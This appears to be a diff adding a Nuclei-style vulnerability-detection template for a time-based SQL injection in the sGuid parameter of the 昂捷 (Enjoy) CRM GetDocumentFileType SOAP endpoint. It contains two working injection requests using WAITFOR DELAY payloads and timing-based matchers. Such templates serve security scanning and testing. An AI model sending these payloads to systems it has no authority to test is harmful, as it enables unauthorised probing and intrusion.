@@ -1,0 +1,61 @@
+id: poc-yaml-enjoyrmis-getdocumentfiletype-sqli
+
+info:
+  name: "昂捷 CRM GetDocumentFileType 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 昂捷CRM
+  description: |
+    Detects SQL Injection vulnerability in the GetDocumentFileType operation of 昂捷CRM. The vulnerability allows time-based SQL injection via the sGuid parameter.
+
+http:
+  - raw:
+      - |
+        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetDocumentFileType"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetDocumentFileType xmlns="http://tempuri.org/">
+              <sGuid>1';WAITFOR DELAY '0:0:5'--</sGuid>
+            </GetDocumentFileType>
+          </soap:Body>
+        </soap:Envelope>
+
+      - |
+        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetDocumentFileType"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetDocumentFileType xmlns="http://tempuri.org/">
+              <sGuid>1';WAITFOR DELAY '0:0:8'--</sGuid>
+            </GetDocumentFileType>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "GetDocumentFileTypeResponse"
+          - "GetDocumentFileTypeResult"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
